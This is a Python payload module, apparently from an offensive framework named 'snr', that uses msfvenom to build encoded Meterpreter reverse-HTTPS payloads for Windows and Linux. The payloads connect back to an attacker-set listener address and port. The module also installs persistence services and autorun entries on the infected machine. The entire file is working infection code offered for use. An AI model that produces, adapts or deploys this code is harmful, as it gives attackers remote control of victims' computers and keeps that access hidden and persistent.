"""
Infect with Meterpreter. Note that it uses Metasploit itself.
"""
import random
import string

from snr.core.payload.payload import (REQUIRED, VALID_IP, VALID_PATH_COMPONENT,
                                      VALID_PORT, VALID_STRING, Context,
                                      Payload)
from snr.core.util import common_utils, programs

msfvenom = programs.program_wrapper_factory("msfvenom")


class MeterpreterPayload(Payload):
    AUTHORS = ("GlobularOne",)
    TARGET_OS_LIST = ("GNU/Linux", "Microsoft Windows")
    INPUTS = (
        ("ENCODER", "x86/shikata_ga_nai", -1, "Encoder to use for x86", VALID_STRING),
        ("LINUX_SERVICE_NAME", "", -1,
         "Name of the persistance service for Linux", REQUIRED | VALID_PATH_COMPONENT),
        ("LINUX_SERVICE_DESCRIPTION", "", -1,
         "Description of the persistance service for Linux", REQUIRED | VALID_STRING),
        ("WINDOWS_SERVICE_NAME", "", -1,
         "Name of the persistance service for Windows", REQUIRED | VALID_PATH_COMPONENT),
        ("LHOST", "", -1, "Local host (Listener address)", REQUIRED | VALID_IP),
        ("LPORT", 8443, -1, "Local port (Listener port)", VALID_PORT),
        ("LURL", "", -1, "Local HTTP address, if left empty will be generated randomly",
         VALID_PATH_COMPONENT),
        Payload.supports_encrypted_access()
    )

    WINDOWS_PAYLOAD = "payload/windows/meterpreter_reverse_https"
    LINUX_PAYLOAD = "payload/linux/x86/meterpreter_reverse_https"
    LURL_LEN = 16

    def generate(self, ctx: Context) -> int:
        variables = self.get_self_variables()
        assert isinstance(variables['ENCODER'], str)
        assert isinstance(variables['LHOST'], str)
        assert isinstance(variables['LPORT'], str)
        assert isinstance(variables['LURL'], str)
        if len(variables['LURL']) == 0:
            variables['LURL'] = "".join(random.sample(
                string.ascii_letters, k=self.LURL_LEN))
            common_utils.print_warning(
                f"Random LURL generated! Set LURL to {variables['LURL']} on the listener")
        for payload_name, platform in ((self.WINDOWS_PAYLOAD, "windows"), (self.LINUX_PAYLOAD, "linux")):
            msfvenom().invoke_and_wait(None,
                                       f"LHOST={variables['LHOST']}",
                                       f"LPORT={variables['LPORT']}",
                                       f"LURL={variables['LURL']}",
                                       options={
                                           "payload": payload_name,
                                           "encoder": variables['ENCODER'],
                                           "output": platform
                                       })
            ctx.mkdir("root/data")
            self.copy_root_to_root(ctx, __file__, platform, f"data/{platform}")
        self.format_payload_and_write(ctx, variables)
        self.add_autorun(ctx)
        return 0


payload = MeterpreterPayload()
